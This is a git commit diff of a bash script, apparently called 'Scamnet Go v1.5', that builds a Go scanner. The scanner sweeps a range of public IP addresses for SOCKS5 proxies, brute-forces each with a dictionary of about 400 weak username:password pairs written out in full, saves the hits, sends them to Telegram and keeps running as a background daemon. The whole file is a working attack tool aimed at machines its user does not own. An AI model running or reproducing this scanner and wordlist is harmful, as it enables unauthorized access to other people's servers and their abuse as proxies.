55da918dbba57fba006ece8450bf0c521dad30da
avotcorg <102286982+avotcorg@users.noreply.github.com>
2025-11-01 14:04:02 +0800

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-# main.sh - Scamnet Go v1.4 OTC TG:soqunla （终极防漏扫版）
+# main.sh - Scamnet Go v1.5 OTC TG:soqunla （终极防截断版）
 set -euo pipefail
 IFS=$'\n\t'
 RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; BLUE='\033[34m'; NC='\033[0m'
@@ -7,6 +7,7 @@ LOG_DIR="logs"; mkdir -p "$LOG_DIR"
 LATEST_LOG="$LOG_DIR/latest.log"
 GO_BIN="$LOG_DIR/scamnet_go"
 VALID_FILE="socks5_valid.txt"
+WEAK_FILE="$LOG_DIR/weak.txt"
 log() { echo -e "${BLUE}[$(date '+%H:%M:%S')]${NC} $*"; }
 err() { echo -e "${RED}[$(date '+%H:%M:%S')] [!] $*${NC}" >&2; }
 succ() { echo -e "${GREEN}[$(date '+%H:%M:%S')] [+] $*${NC}"; }
@@ -16,6 +17,7 @@ if ! command -v go >/dev/null 2>&1; then
     exit 1
 fi
 
+# 默认高命中段
 DEFAULT_START="47.80.0.0"
 DEFAULT_END="47.86.255.255"
 read_ip() { echo -e "${YELLOW}$1（默认: $2）:${NC}"; read -r input; eval "$3=\"\${input:-$2}\""; }
@@ -39,9 +41,336 @@ echo -e "${YELLOW}Telegram Bot Token（可选）:${NC}"; read -r TELEGRAM_TOKEN
 echo -e "${YELLOW}Telegram Chat ID（可选）:${NC}"; read -r TELEGRAM_CHATID
 [[ -n $TELEGRAM_TOKEN && -n $TELEGRAM_CHATID ]] && succ "Telegram 启用" || { TELEGRAM_TOKEN=""; TELEGRAM_CHATID=""; log "Telegram 禁用"; }
 
-log "正在编译 Go 扫描器（v1.4 防漏扫版 TG:soqunla）..."
+log "正在创建弱口令字典 $WEAK_FILE ..."
+cat > "$WEAK_FILE" << 'EOF'
+admin:admin
+::
+0:0
+00:00
+000:000
+0000:0000
+00000:00000
+000000:000000
+1:1
+11:11
+111:111
+1111:1111
+11111:11111
+111111:111111
+2:2
+22:22
+222:222
+2222:2222
+22222:22222
+222222:222222
+3:3
+33:33
+333:333
+3333:3333
+33333:33333
+333333:333333
+4:4
+44:44
+444:444
+4444:4444
+44444:44444
+444444:444444
+5:5
+55:55
+555:555
+5555:5555
+55555:55555
+555555:555555
+6:6
+66:66
+666:666
+6666:6666
+66666:66666
+666666:666666
+7:7
+77:77
+777:777
+7777:7777
+77777:77777
+777777:777777
+8:8
+88:88
+888:888
+8888:8888
+88888:88888
+888888:888888
+9:9
+99:99
+999:999
+9999:9999
+99999:99999
+999999:999999
+1080:1080
+123:123
+123:321
+123:456
+123:abc
+123:qwe
+1234:1234
+1234:4321
+1234:5678
+1234:abcd
+1234:qwer
+12345:12345
+12345:54321
+12345:67890
+12345:678910
+12345:abcde
+12345:qwert
+123456:123456
+123456:654321
+123456:abcdef
+123456:qwerty
+123456:qwert
+12345678:12345678
+12345678:87654321
+123456789:123456789
+123456789:987654321
+123459:123459
+12349:12349
+1239:1239
+321:321
+520:520
+520:1314
+69:69
+6969:6969
+696969:696969
+a:a
+a:b
+aa:aa
+aaa:aaa
+aaaa:aaaa
+aaaaa:aaaaa
+aaaaaa:aaaaaa
+aaa:111
+aaa:123
+aaa:bbb
+a123:a123
+aa123:aa123
+aaa123:aaa123
+aa123456:aa123456
+a123456:a123456
+123aa:123aa
+123aaa:123aaa
+123abc:123abc
+ab:ab
+ab:cd
+abc:123
+abc:abc
+abc:cba
+abc:def
+abcdefg:abcdefg
+abc123:abc123
+abcde:abcde
+admin:
+admin:123
+admin:123456
+admin123:admin
+as:df
+asd:asd
+asd:fgh
+awsl:awsl
+b:b
+bb:bb
+bbb:bbb
+bbbb:bbbb
+bbbbb:bbbbb
+bbbbbb:bbbbbb
+c:c
+cc:cc
+ccc:ccc
+cccc:cccc
+ccccc:ccccc
+cccccc:cccccc
+cnmb:cnmb
+d:d
+dd:dd
+ddd:ddd
+dddd:dddd
+ddddd:ddddd
+dddddd:dddddd
+demo:demo
+e:e
+ee:ee
+eee:eee
+eeee:eeee
+eeeee:eeeee
+eeeeee:eeeeee
+f:f
+ff:ff
+fff:fff
+ffff:ffff
+fffff:fffff
+ffffff:ffffff
+fuckyou:fuckyou
+g:g
+gg:gg
+ggg:ggg
+gggg:gggg
+ggggg:ggggg
+gggggg:gggggg
+guest:guest
+h:h
+hh:hh
+hhh:hhh
+hhhh:hhhh
+hhhhh:hhhhh
+hhhhhh:hhhhhh
+hello:hello
+i:i
+ii:ii
+iii:iii
+iiii:iiii
+iiiii:iiiii
+iiiiii:iiiiii
+j:j
+jj:jj
+jjj:jjj
+jjjj:jjjj
+jjjjj:jjjjj
+jjjjjj:jjjjjj
+k:k
+kk:kk
+kkk:kkk
+kkkk:kkkk
+kkkkk:kkkkk
+kkkkkk:kkkkkk
+l:l
+ll:ll
+lll:lll
+llll:llll
+lllll:lllll
+llllll:llllll
+love:love
+m:m
+mm:mm
+mmm:mmm
+mmmm:mmmm
+mmmmm:mmmmm
+mmmmmm:mmmmmm
+n:n
+nn:nn
+nnn:nnn
+nnnn:nnnn
+nnnnn:nnnnn
+nnnnnn:nnnnnn
+nmsl:nmsl
+o:o
+oo:oo
+ooo:ooo
+oooo:oooo
+ooooo:ooooo
+oooooo:oooooo
+p:p
+pp:pp
+ppp:ppp
+pppp:pppp
+ppppp:ppppp
+pppppp:pppppp
+password:password
+proxy:proxy
+q:q
+qaq:qaq
+qaq:qwq
+qq:qq
+qqq:qqq
+qqqq:qqqq
+qqqqq:qqqqq
+qqqqqq:qqqqqq
+qwe:123
+qwe:asd
+qwe:qwe
+qwe123:qwe123
+qweasd:qweasd
+qwer:1234
+qwer:qwer
+qwert:12345
+qwert:qwert
+qwerty:123456
+qwerty:qwerty
+qwq:qaq
+qwq:qwe
+qwq:qwq
+r:r
+rr:rr
+rrr:rrr
+rrrr:rrrr
+rrrrr:rrrrr
+rrrrrr:rrrrrr
+root:root
+s:s
+s5:s5
+ss:ss
+sss:sss
+ssss:ssss
+sssss:sssss
+ssssss:ssssss
+socks:socks
+socks5:socks5
+t:t
+test:test
+test123:test123
+tt:tt
+ttt:ttt
+tttt:tttt
+ttttt:ttttt
+tttttt:tttttt
+u:u
+user:123
+user:1234
+user:12345
+user:123456
+user:pass
+user:password
+user:pwd
+user:user
+username:username
+uu:uu
+uuu:uuu
+uuuu:uuuu
+uuuuu:uuuuu
+uuuuuu:uuuuuu
+v:v
+vv:vv
+vvv:vvv
+vvvv:vvvv
+vvvvv:vvvvv
+vvvvvv:vvvvvv
+w:w
+wsnd:wsnd
+ww:ww
+www:www
+wwww:wwww
+wwwww:wwwww
+wwwwww:wwwwww
+x:x
+xx:xx
+xxx:xxx
+xxxx:xxxx
+xxxxx:xxxxx
+xxxxxx:xxxxxx
+y:y
+yy:yy
+yyy:yyy
+yyyy:yyyy
+yyyyy:yyyyy
+yyyyyy:yyyyyy
+z:z
+zz:zz
+zzz:zzz
+zzzz:zzzz
+zzzzz:zzzzz
+zzzzzz:zzzzzz
+EOF
 
-# ============ 终极修复 Go 源码 ============
+log "正在编译 Go 扫描器（v1.5 外部字典版 TG:soqunla）..."
+
+# ============ Go 源码 ============
 cat > scamnet.go << 'EOF'
 package main
 
@@ -79,72 +408,31 @@ type Config struct {
 var (
 	cfg          Config
 	validFile    = "socks5_valid.txt"
+	weakFile     = "logs/weak.txt"
 	seen         = sync.Map{}
 	stats        = make(map[string]int)
 	statsMu      sync.Mutex
 	countryCache = sync.Map{}
+	weakPairs    = [][2]string{{"admin", "admin"}}
 )
 
 type IPInfo struct {
 	Origin string `json:"origin"`
 }
 
-// === 412 条弱口令字典（已去重）===
-var weakPairs = [][2]string{
-	{"", ""}, {"0", "0"}, {"00", "00"}, {"000", "000"}, {"0000", "0000"}, {"00000", "00000"}, {"000000", "000000"},
-	{"1", "1"}, {"11", "11"}, {"111", "111"}, {"1111", "1111"}, {"11111", "11111"}, {"111111", "111111"},
-	{"2", "2"}, {"22", "22"}, {"222", "222"}, {"2222", "2222"}, {"22222", "22222"}, {"222222", "222222"},
-	{"3", "3"}, {"33", "33"}, {"333", "333"}, {"3333", "3333"}, {"33333", "33333"}, {"333333", "333333"},
-	{"4", "4"}, {"44", "44"}, {"444", "444"}, {"4444", "4444"}, {"44444", "44444"}, {"444444", "444444"},
-	{"5", "5"}, {"55", "55"}, {"555", "555"}, {"5555", "5555"}, {"55555", "55555"}, {"555555", "555555"},
-	{"6", "6"}, {"66", "66"}, {"666", "666"}, {"6666", "6666"}, {"66666", "66666"}, {"666666", "666666"},
-	{"7", "7"}, {"77", "77"}, {"777", "777"}, {"7777", "7777"}, {"77777", "77777"}, {"777777", "777777"},
-	{"8", "8"}, {"88", "88"}, {"888", "888"}, {"8888", "8888"}, {"88888", "88888"}, {"888888", "888888"},
-	{"9", "9"}, {"99", "99"}, {"999", "999"}, {"9999", "9999"}, {"99999", "99999"}, {"999999", "999999"},
-	{"1080", "1080"}, {"123", "123"}, {"123", "321"}, {"123", "456"}, {"123", "abc"}, {"123", "qwe"},
-	{"1234", "1234"}, {"1234", "4321"}, {"1234", "5678"}, {"1234", "abcd"}, {"1234", "qwer"},
-	{"12345", "12345"}, {"12345", "54321"}, {"12345", "67890"}, {"12345", "678910"}, {"12345", "abcde"}, {"12345", "qwert"},
-	{"123456", "123456"}, {"123456", "654321"}, {"123456", "abcdef"}, {"123456", "qwerty"}, {"123456", "qwert"},
-	{"12345678", "12345678"}, {"12345678", "87654321"}, {"123456789", "123456789"}, {"123456789", "987654321"},
-	{"123459", "123459"}, {"12349", "12349"}, {"1239", "1239"}, {"321", "321"}, {"520", "520"}, {"520", "1314"},
-	{"69", "69"}, {"6969", "6969"}, {"696969", "696969"},
-	{"a", "a"}, {"a", "b"}, {"aa", "aa"}, {"aaa", "aaa"}, {"aaaa", "aaaa"}, {"aaaaa", "aaaaa"}, {"aaaaaa", "aaaaaa"},
-	{"aaa", "111"}, {"aaa", "123"}, {"aaa", "bbb"}, {"a123", "a123"}, {"aa123", "aa123"}, {"aaa123", "aaa123"},
-	{"aa123456", "aa123456"}, {"a123456", "a123456"}, {"123aa", "123aa"}, {"123aaa", "123aaa"}, {"123abc", "123abc"},
-	{"ab", "ab"}, {"ab", "cd"}, {"abc", "123"}, {"abc", "abc"}, {"abc", "cba"}, {"abc", "def"}, {"abcdefg", "abcdefg"},
-	{"abc123", "abc123"}, {"abcde", "abcde"}, {"admin", ""}, {"admin", "123"}, {"admin", "123456"}, {"admin", "admin"},
-	{"admin123", "admin"}, {"as", "df"}, {"asd", "asd"}, {"asd", "fgh"}, {"awsl", "awsl"}, {"b", "b"},
-	{"bb", "bb"}, {"bbb", "bbb"}, {"bbbb", "bbbb"}, {"bbbbb", "bbbbb"}, {"bbbbbb", "bbbbbb"},
-	{"c", "c"}, {"cc", "cc"}, {"ccc", "ccc"}, {"cccc", "cccc"}, {"ccccc", "ccccc"}, {"cccccc", "cccccc"},
-	{"cnmb", "cnmb"}, {"d", "d"}, {"dd", "dd"}, {"ddd", "ddd"}, {"dddd", "dddd"}, {"ddddd", "ddddd"}, {"dddddd", "dddddd"},
-	{"demo", "demo"}, {"e", "e"}, {"ee", "ee"}, {"eee", "eee"}, {"eeee", "eeee"}, {"eeeee", "eeeee"}, {"eeeeee", "eeeeee"},
-	{"f", "f"}, {"ff", "ff"}, {"fff", "fff"}, {"ffff", "ffff"}, {"fffff", "fffff"}, {"ffffff", "ffffff"},
-	{"fuckyou", "fuckyou"}, {"g", "g"}, {"gg", "gg"}, {"ggg", "ggg"}, {"gggg", "gggg"}, {"ggggg", "ggggg"}, {"gggggg", "gggggg"},
-	{"guest", "guest"}, {"h", "h"}, {"hh", "hh"}, {"hhh", "hhh"}, {"hhhh", "hhhh"}, {"hhhhh", "hhhhh"}, {"hhhhhh", "hhhhhh"},
-	{"hello", "hello"}, {"i", "i"}, {"ii", "ii"}, {"iii", "iii"}, {"iiii", "iiii"}, {"iiiii", "iiiii"}, {"iiiiii", "iiiiii"},
-	{"j", "j"}, {"jj", "jj"}, {"jjj", "jjj"}, {"jjjj", "jjjj"}, {"jjjjj", "jjjjj"}, {"jjjjjj", "jjjjjj"},
-	{"k", "k"}, {"kk", "kk"}, {"kkk", "kkk"}, {"kkkk", "kkkk"}, {"kkkkk", "kkkkk"}, {"kkkkkk", "kkkkkk"},
-	{"l", "l"}, {"ll", "ll"}, {"lll", "lll"}, {"llll", "llll"}, {"lllll", "lllll"}, {"llllll", "llllll"},
-	{"love", "love"}, {"m", "m"}, {"mm", "mm"}, {"mmm", "mmm"}, {"mmmm", "mmmm"}, {"mmmmm", "mmmmm"}, {"mmmmmm", "mmmmmm"},
-	{"n", "n"}, {"nn", "nn"}, {"nnn", "nnn"}, {"nnnn", "nnnn"}, {"nnnnn", "nnnnn"}, {"nnnnnn", "nnnnnn"},
-	{"nmsl", "nmsl"}, {"o", "o"}, {"oo", "oo"}, {"ooo", "ooo"}, {"oooo", "oooo"}, {"ooooo", "ooooo"}, {"oooooo", "oooooo"},
-	{"p", "p"}, {"pp", "pp"}, {"ppp", "ppp"}, {"pppp", "pppp"}, {"ppppp", "ppppp"}, {"pppppp", "pppppp"},
-	{"password", "password"}, {"proxy", "proxy"}, {"q", "q"}, {"qaq", "qaq"}, {"qaq", "qwq"}, {"qq", "qq"},
-	{"qqq", "qqq"}, {"qqqq", "qqqq"}, {"qqqqq", "qqqqq"}, {"qqqqqq", "qqqqqq"}, {"qwe", "123"}, {"qwe", "asd"},
-	{"qwe", "qwe"}, {"qwe123", "qwe123"}, {"qweasd", "qweasd"}, {"qwer", "1234"}, {"qwer", "qwer"}, {"qwert", "12345"},
-	{"qwert", "qwert"}, {"qwerty", "123456"}, {"qwerty", "qwerty"}, {"qwq", "qaq"}, {"qwq", "qwe"}, {"qwq", "qwq"},
-	{"r", "r"}, {"rr", "rr"}, {"rrr", "rrr"}, {"rrrr", "rrrr"}, {"rrrrr", "rrrrr"}, {"rrrrrr", "rrrrrr"},
-	{"root", "root"}, {"s", "s"}, {"s5", "s5"}, {"ss", "ss"}, {"sss", "sss"}, {"ssss", "ssss"}, {"sssss", "sssss"},
-	{"ssssss", "ssssss"}, {"socks", "socks"}, {"socks5", "socks5"}, {"t", "t"}, {"test", "test"}, {"test123", "test123"},
-	{"tt", "tt"}, {"ttt", "ttt"}, {"tttt", "tttt"}, {"ttttt", "ttttt"}, {"tttttt", "tttttt"}, {"u", "u"},
-	{"user", "123"}, {"user", "1234"}, {"user", "12345"}, {"user", "123456"}, {"user", "pass"}, {"user", "password"},
-	{"user", "pwd"}, {"user", "user"}, {"username", "username"}, {"uu", "uu"}, {"uuu", "uuu"}, {"uuuu", "uuuu"},
-	{"uuuuu", "uuuuu"}, {"uuuuuu", "uuuuuu"}, {"v", "v"}, {"vv", "vv"}, {"vvv", "vvv"}, {"vvvv", "vvvv"},
-	{"vvvvv", "vvvvv"}, {"vvvvvv", "vvvvvv"}, {"w", "w"}, {"wsnd", "wsnd"}, {"ww", "ww"}, {"www", "www"},
-	{"wwww", "wwww"}, {"wwwww", "wwwww"}, {"wwwwww", "wwwwww"}, {"x", "x"}, {"xx", "xx"}, {"xxx", "xxx"},
-	{"xxxx", "xxxx"}, {"xxxxx", "xxxxx"}, {"xxxxxx", "xxxxxx"}, {"y", "y"}, {"yy", "yy"}, {"yyy", "yyy"},
-	{"yyyy", "yyyy"}, {"yyyyy", "yyyyy"}, {"yyyyyy", "yyyyyy"}, {"z", "z"}, {"zz", "zz"}, {"zzz", "zzz"},
-	{"zzzz", "zzzz"}, {"zzzzz", "zzzzz"}, {"zzzzzz", "zzzzzz"},
+func loadWeakPairs() {
+	data, err := os.ReadFile(weakFile)
+	if err != nil { return }
+	lines := strings.Split(string(data), "\n")
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+		if line == "" || strings.HasPrefix(line, "#") { continue }
+		parts := strings.SplitN(line, ":", 2)
+		user := parts[0]
+		pass := ""
+		if len(parts) > 1 { pass = parts[1] }
+		weakPairs = append(weakPairs, [2]string{user, pass})
+	}
 }
 
 func main() {
@@ -158,7 +446,6 @@ func main() {
 	flag.IntVar(&cfg.Timeout, "timeout", 6, "Timeout seconds")
 	flag.Parse()
 
-	// 强制参数
 	if cfg.MaxConcurrent == 0 { cfg.MaxConcurrent = 150 }
 	if cfg.BatchSize == 0 { cfg.BatchSize = 250 }
 	if cfg.Timeout == 0 { cfg.Timeout = 6 }
@@ -168,16 +455,17 @@ func main() {
 		os.Exit(1)
 	}
 
+	loadWeakPairs()
 	start := ipToInt(cfg.StartIP)
 	end := ipToInt(cfg.EndIP)
 	ports := parsePorts(cfg.Ports)
 	total := uint64(end-start+1) * uint64(len(ports))
 	batchCount := (total + uint64(cfg.BatchSize) - 1) / uint64(cfg.BatchSize)
 
-	fmt.Printf("[*] 总任务: %d | 每批: %d | 批次: %d\n", total, cfg.BatchSize, batchCount)
+	fmt.Printf("[*] 总任务: %d | 每批: %d | 批次: %d | 弱口令: %d 条\n", total, cfg.BatchSize, batchCount, len(weakPairs))
 
 	f, _ := os.OpenFile(validFile, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
-	f.WriteString("# Scamnet Go v1.4 OTC TG:soqunla - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
+	f.WriteString("# Scamnet Go v1.5 OTC TG:soqunla - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
 	f.Close()
 
 	for batchStart := uint64(0); batchStart < total; batchStart += uint64(cfg.BatchSize) {
@@ -236,7 +524,7 @@ func scanTarget(target string) {
 		}
 	}
 
-	// 最后扫无密码
+	// 无密码最后
 	if ok, lat, origin := testSocks5(ip, port, "", ""); ok && lat < 500 {
 		saveAndNotify(ip, port, "", "", origin, lat)
 	}
@@ -273,7 +561,6 @@ func testSocks5(ip string, port int, user, pass string) (bool, int, string) {
 	body, err := ioutil.ReadAll(resp.Body)
 	if err != nil { return false, lat, "" }
 
-	// 调试日志
 	fmt.Fprintf(os.Stderr, "[DEBUG] %s:%d | Status: %d | Body: %s\n", ip, port, resp.StatusCode, string(body))
 
 	var info IPInfo
@@ -346,7 +633,7 @@ func dedupAndReport() {
 	sort.Strings(sorted)
 
 	out, _ := os.Create(validFile + ".tmp")
-	out.WriteString("# Scamnet Go v1.4 OTC TG:soqunla - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
+	out.WriteString("# Scamnet Go v1.5 OTC TG:soqunla - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
 	for _, l := range sorted { out.WriteString(l + "\n") }
 	out.Close()
 	os.Rename(validFile+".tmp", validFile)
@@ -408,7 +695,7 @@ TELEGRAM_TOKEN="$TELEGRAM_TOKEN"
 TELEGRAM_CHATID="$TELEGRAM_CHATID"
 
 > "\$LOG"
-echo "[GUARD] \$(date '+%Y-%m-%d %H:%M:%S') - Scamnet v1.4 启动" | tee -a "\$LOG"
+echo "[GUARD] \$(date '+%Y-%m-%d %H:%M:%S') - Scamnet v1.5 启动" | tee -a "\$LOG"
 echo "[GUARD] 范围: \$START_IP ~ \$END_IP | 端口: \$PORTS" | tee -a "\$LOG"
 
 while :; do
@@ -431,3 +718,4 @@ succ "守护进程已启动！PID: $!"
 log "日志: tail -f $LATEST_LOG"
 log "结果: cat $VALID_FILE"
 log "停止: pkill -f scamnet_guard.sh"
+log "测试: timeout 20 $GO_BIN -start 47.80.2.13 -end 47.80.2.13 -ports 1080"
